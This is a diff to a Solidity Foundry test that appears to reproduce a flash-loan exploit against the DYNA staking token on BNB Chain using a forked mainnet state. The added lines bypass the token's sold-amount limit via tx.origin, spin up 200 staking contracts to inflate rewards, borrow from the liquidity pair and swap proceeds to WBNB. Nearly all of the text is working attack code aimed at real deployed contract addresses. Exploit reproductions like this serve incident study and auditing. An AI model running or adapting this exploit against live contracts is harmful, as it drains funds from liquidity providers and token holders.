@@ -16,6 +16,11 @@ interface IStakingDYNA {
     function redeem(uint256 _redeemAmount) external;
 }
 
+interface IDYNA is IERC20 {
+    function _setMaxSoldAmount(uint256 maxvalue) external;
+    function _maxSoldAmount() external view returns(uint256);
+}
+
 contract StakingReward {
     IERC20 DYNA = IERC20(0x5c0d0111ffc638802c9EfCcF55934D5C63aB3f79);
     IStakingDYNA StakingDYNA = IStakingDYNA(0xa7B5eabC3Ee82c585f5F4ccC26b81c3Bd62Ff3a9);
@@ -37,7 +42,7 @@ contract StakingReward {
 }
 
 contract ContractTest is Test {
-    IERC20 DYNA = IERC20(0x5c0d0111ffc638802c9EfCcF55934D5C63aB3f79);
+    IDYNA DYNA = IDYNA(0x5c0d0111ffc638802c9EfCcF55934D5C63aB3f79);
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     IStakingDYNA StakingDYNA = IStakingDYNA(0xa7B5eabC3Ee82c585f5F4ccC26b81c3Bd62Ff3a9);
     Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
@@ -45,18 +50,28 @@ contract ContractTest is Test {
     StakingReward stakingReward;
     StakingReward[] StakingRewardList;
     uint256 flashLoanAmount;
+    address DYNAOwner = 0xA8Ff6C807654c5B2B55f188e9a7Ce31C8d192353;
 
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
         cheats.createSelectFork("bsc", 25879486);
+        cheats.label(address(DYNA), "DYNA");
+        cheats.label(address(WBNB), "WBNB");
+        cheats.label(address(Router), "Router");
+        cheats.label(address(Pair), "Pair");
+        cheats.label(address(StakingDYNA), "StakingDYNA");
     }
 
     function testExploit() external {
-        cheats.startPrank();
         StakingRewardFactory();
+        DYNA.transfer(address(Pair), 1); //
+        DYNA.transfer(tx.origin, 1e17);  //
+        cheats.startPrank(tx.origin);    // Bypass Sold Amount Limit
+        DYNA.transfer(address(Pair), 1); //
+        cheats.stopPrank();              //
         cheats.warp(block.timestamp + 7 * 24 * 60 * 60); // deposit a week ago
-        flashLoanAmount = DYNA.balanceOf(address(Pair)) - 1;
+        flashLoanAmount = DYNA.balanceOf(address(Pair)) - 3;
         Pair.swap(flashLoanAmount, 0, address(this), new bytes(1));
         DYNAToWBNB();
 
@@ -64,9 +79,9 @@ contract ContractTest is Test {
     }
 
     function StakingRewardFactory() internal {
-        deal(address(DYNA), address(this), 650 * 1e18);
-        uint256 preStakingRewardAmount = 650 * 1e18 / 100;
-        for(uint256 i; i < 100; ++i){
+        deal(address(DYNA), address(this), 1001 * 1e18);
+        uint256 preStakingRewardAmount = 1000 * 1e18 / 200;
+        for(uint256 i; i < 200; ++i){
             stakingReward = new StakingReward(address(this));
             DYNA.transfer(address(stakingReward), preStakingRewardAmount);
             stakingReward.deposit(preStakingRewardAmount);
@@ -82,17 +97,20 @@ contract ContractTest is Test {
             StakingRewardList[i].deposit(amount);
             StakingRewardList[i].withdraw(amount);
         }
-        DYNA.transfer(address(Pair), flashLoanAmount * 10000 / 9975 + 1000);
+        DYNA.transfer(address(Pair), flashLoanAmount * 100000 / 9975 / 9 + 1000);
     }
 
     function DYNAToWBNB() internal {
+        DYNA.transfer(tx.origin, DYNA.balanceOf(address(this)));
+        cheats.startPrank(tx.origin);
         DYNA.approve(address(Router), type(uint256).max);
         address[] memory path = new address[](2);
         path[0] = address(DYNA);
         path[1] = address(WBNB);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            DYNA.balanceOf(address(this)), 0, path, address(this), block.timestamp
+            DYNA.balanceOf(tx.origin), 0, path, address(this), block.timestamp
         );
+        cheats.stopPrank();
     }
 
 }
